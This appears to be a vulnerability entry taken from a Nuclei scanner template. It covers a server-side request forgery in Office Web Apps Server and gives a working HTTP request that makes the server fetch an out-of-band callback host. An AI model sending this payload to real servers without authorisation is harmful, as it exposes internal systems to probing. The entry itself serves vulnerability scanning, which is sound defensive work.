# Vulnerability: Office Web Apps Server Full Read - Server Side Request Forgery
**Classification:** CWE-918
**Source:** Nuclei Template (`office-webapps-ssrf.yaml`)

## Description
Office Web Apps Server Full Read is vulnerable to SSRF.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /oh/wopi/files/@/wFileId/contents?wFileId=http://{{oast}}/{{string}}.xlsx%3fbody={{string}}%26header=Location:http://oast.pro%26status=302&access_token_ttl=0 HTTP/1.1
Host: {{Hostname}}
```

